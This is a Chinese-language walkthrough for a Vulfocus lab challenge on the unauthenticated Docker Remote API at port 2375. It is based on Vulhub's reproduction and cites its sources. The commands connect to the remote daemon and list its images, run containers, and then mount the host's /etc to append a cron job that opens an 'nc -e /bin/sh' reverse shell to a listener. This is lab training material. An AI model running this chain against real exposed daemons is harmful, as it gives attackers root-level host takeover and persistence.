# daemon-api 未授权访问

> **一句话打法：**用 Docker CLI 直连题目映射出的 `2375` 端口；未授权时先确认远端 daemon，再通过该 API 创建容器执行命令。上游 Vulhub 的同类复现进一步通过挂载 daemon 主机的 `/etc` 并写入 cron 建立回连。[S1][S2]

题库镜像：`vulfocus/daemon-api:latest`；容器端口：`2375`。目前未找到能确认与这个 Vulfocus 镜像完全相同的专属 WP；以下操作链依据 Docker Remote API 未授权访问的 Vulhub 官方复现整理，具体容器/daemon 部署差异见排坑。[S1]

## 操作步骤

1. 将 `<映射端口>` 换成 Vulfocus 实例实际映射到宿主机的端口，使用 Docker 客户端直接连题目 daemon；成功返回远端 Docker 版本信息即表示 API 可访问且当前请求无需认证。[S1][S3]

```powershell
$endpoint = 'tcp://<靶场IP>:<映射端口>'
docker -H $endpoint version
```

2. 查询**远端 daemon**上的镜像和容器，选它实际已有的 Linux 镜像；不要用本机 `docker images` 的结果判断靶场内是否有镜像。[S2][S3]

```powershell
docker -H $endpoint images
docker -H $endpoint ps -a
```

3. 用远端 daemon 新建容器执行命令，确认未授权 API 可创建并运行容器。把 `alpine:latest` 换成上一步列出的可用 Linux 镜像；若远端能拉取镜像且列表中没有 Alpine，也可直接尝试该镜像。[S1][S2]

```powershell
docker -H $endpoint run --rm alpine:latest id
```

4. 若按 Vulhub 的 cron 回连复现链继续操作：在可接收回连的机器上启动监听，将 `<回连IP>`、`<回连端口>` 替换为监听地址；该链将远端 daemon 主机的 `/etc` 挂载进 Alpine 容器，并向其 root crontab 追加回连命令；目录挂载会使容器操作影响 daemon 主机文件系统。[S1][S2][S4]

```powershell
docker -H $endpoint run --rm `
  -v /etc:/tmp/etc `
  alpine:latest `
  sh -c "echo '* * * * * /usr/bin/nc <回连IP> <回连端口> -e /bin/sh' >> /tmp/etc/crontabs/root"
```

## 本题特有排坑

- Vulfocus 对外访问应使用实例映射端口，但 Docker 客户端目标协议写 `tcp://`；题库里的 `2375` 是容器内部端口，不一定就是浏览器/本机可直接访问的端口。[S1][S3]
- `images`、`ps` 等命令必须带 `-H $endpoint`，否则查询的是本机 Docker daemon，不是题目开放的 `2375` 服务。[S2][S3]
- 第 4 步是 Vulhub 原文中的 Alpine + `/etc/crontabs/root` + `nc -e` 变体，依赖目标 daemon 主机有运行 cron、对应 crontab 路径存在，且镜像里的 `nc` 支持 `-e`；这些条件未由 Vulfocus 专属资料确认。条件不符时，不要把 cron 路径或反弹参数当成通用接口；第 3 步仍可用于验证远端容器创建/命令执行。[S1]

## 来源

- **[S1] 官方同类环境与完整复现：**[Vulhub — Docker Remote API Unauthorized Access Leads to Remote Code Execution](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.md) — 明确 Docker daemon 未认证监听 TCP `2375`；给出 Python Docker SDK 连接、创建 Alpine 容器、将宿主机 `/etc` 挂载至 `/tmp/etc` 并写入 `/tmp/etc/crontabs/root` 的复现链。支撑步骤 1、4 及 cron 链适用条件。
- **[S2] 技术复现文章：**[青藤云安全 — 容器安全防线：Docker攻击方式与防范技术探究](https://www.qingteng.cn/news/642fdee8021c63005a13bd44.html) — 针对 Vulhub `docker/unauthorized-rce` 展示 2375 端口、Alpine 容器、`/etc` 目录挂载和 cron 回连命令。支撑步骤 2–4。
- **[S3] 技术复现及环境排坑：**[CN-SEC — 新姿势之Docker Remote API未授权访问漏洞分析和利用](https://cn-sec.com/archives/53287.html) — 介绍 Docker Remote API 未授权访问，展示 `docker -H tcp://<目标>:2375 version`、远端容器/镜像查询、Docker API 直接请求及挂载宿主机目录、写入 crontab 的复现方式。支撑步骤 1–4 和远端/本机 daemon 区分排坑。
- **[S4] Docker 官方安全说明：**[Docker Engine security](https://docs.docker.com/engine/security/) — 说明能控制 daemon 的用户可通过目录挂载影响 Docker host 文件系统，并说明 Docker daemon 通常具有 root 权限；支撑本题利用原理边界，不作为具体命令来源。

来源清单：[`../sources/016_daemon-api_unauthorized/_meta.md`](../sources/016_daemon-api_unauthorized/_meta.md)

